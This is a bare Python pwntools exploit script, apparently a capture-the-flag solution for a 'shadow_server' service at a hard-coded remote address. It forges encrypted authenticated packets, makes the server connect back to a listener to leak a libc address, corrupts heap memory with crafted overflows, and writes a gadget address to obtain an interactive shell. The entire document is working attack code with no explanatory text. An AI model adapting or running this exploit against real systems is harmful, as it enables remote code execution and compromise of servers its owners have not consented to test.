import hashlib
from Crypto.Cipher import AES
import sys
from pwn import *
import os
import socket
host = "54.153.22.136" 
#host = "localhost"

#s = process('../../shadow_server')
s = remote("54.153.22.136",3343)
s.recvuntil("at ")
port = int(s.recvline())
print "localhost",port
r = remote(host,port)

def gen_payload(size,data=""):
    timestamp = time.time()
    noise = os.urandom(8)
    m = hashlib.sha256()
    m.update("meiyoumima")
    m.update(p64(timestamp))
    m.update(noise)
    token = m.digest()[:16]
    payload = token
    m = hashlib.sha256()
    m.update("meiyoumima")
    m.update(token)
    secret = m.digest()
    aes = AES.new(secret[:16], AES.MODE_CBC,secret[16:32])
    payload += aes.encrypt(p64(timestamp)+noise)
    m = hashlib.sha256()
    m.update(token+p64(timestamp)+noise+p8(1)+p32(size)+p8(0)+"a"*10+"\x00"*0x20+data)
    hash_sum = m.digest()
    payload += aes.encrypt(p8(1)+p32(size)+p8(0)+"a"*10+hash_sum+data)
    return payload

payload = gen_payload(79)
r.send(payload)

IP = # local public IP

payload = gen_payload(96,"\x01\x01\x01"+
        socket.inet_aton(IP)+
        p16(4444)[::-1]+
        "\x80"*7)
ss = remote(host,port)
ss.send(payload)

l = listen(4444)
_ = l.wait_for_connection()
data = l.recvn(0x60)
idx = data.find("\x7f")
libc = u64(data[idx-5:idx+3])-0x108fbd0
print hex(libc)
#libc = int(raw_input(":"),16)
r.send("a"*0x28+p64(0x4)+"a"*0x448+p64(0x201)+p64(libc+0x3ed8e8))

rr = remote(host,port)
payload = gen_payload(0x220+80-1)
rr.send(payload)

rrr = remote(host,port)
payload = gen_payload(0x220+80-1)
rrr.send(payload)
rrr.send(p64(libc+0xe5858))

s.interactive()
